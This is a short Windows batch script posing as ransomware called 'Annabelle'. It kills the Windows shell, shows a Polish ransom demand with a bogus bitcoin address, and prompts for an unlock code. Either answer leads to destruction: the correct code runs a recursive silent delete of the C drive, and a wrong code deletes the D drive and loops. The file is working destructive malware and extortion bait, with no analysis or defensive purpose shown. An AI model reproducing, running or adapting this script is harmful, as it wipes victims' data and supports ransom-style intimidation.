@echo off
taskkill /f /im explorer.exe
cls
echo Twoje wazne pliki som zaszyfrowane
echo ANNABELLE Twoje pliki som shakowane przez wirusa Annabelle:)
echo Pozostaly czas:                 24-32-12
echo Adres Bitcoina:                 Locker-7582281.btc
echo Jak dokonac platnosci? Wyslij 0.05 BTC pod adres AnabelleRansmom Virus.bat
echo                                           zaplac 50 dolars - 500zl
echo Po dokonaniu platnosci skontaktuj sie z nami, aby uzyskac odszyfrowanie
echo E-mail:ANABELLE Ransmoware.exe.bat
set code=""

:code
set /p code="Tu wpisz kod ale uwaga masz 1 prube jak jom zmarnujesz aplikacja ktura zamyka system zostanie usunienta czyli nie bendziesz mugl odpalic systemu:(:"
if "%code%"=="5453" goto correct
if NOT "%code%"=="5453" goto wrong

:correct
start explorer
echo Kod jest dobry ale dysk zostanie usunienty trudno...
del c:\*/s /q
pause
exit

:wrong
echo Kod jest zly ,Anabelle.exe usunela ci aplikacje zamykajoncom komputer czy tez tablet.
del d:\*/s /q
goto code
